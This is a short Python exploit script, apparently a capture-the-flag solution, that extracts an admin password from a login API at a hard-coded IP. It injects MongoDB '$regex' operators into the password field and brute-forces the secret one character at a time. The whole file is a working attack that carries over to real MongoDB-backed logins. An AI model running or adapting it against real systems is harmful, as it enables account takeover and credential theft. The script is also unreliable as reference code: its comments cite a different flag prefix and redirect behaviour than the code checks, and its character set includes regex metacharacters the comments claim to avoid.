import requests
import string

# From https://blog.0daylabs.com/2016/09/05/mongo-db-password-extraction-mmactf-100/

# We are sure that password is the flag which starts with "TWCTF{"
# and ends with "}"

flag = "CHTB{"
url = "http://206.189.121.131:31118/api/login"

# Each time a 302 redirect is seen, we should restart the loop

restart = True

while restart:
    restart = False

    # Characters like *, ., &, and + has to be avoided because we use regex

    for i in string.ascii_letters + string.digits + "!@#$%^()@_{}":
        payload = flag + i
        post_data = {'username': 'admin', 'password[$regex]': payload + ".*"}
        r = requests.post(url, data=post_data, allow_redirects=False)

        # A correct password means we get a 302 redirect

        if "Failed" not in r.text:
            print(payload)
            restart = True
            flag = payload

            # Exit if "}" gives a valid redirect

            if i == "}":
                print("\nFlag: " + flag)

                exit(0)
            break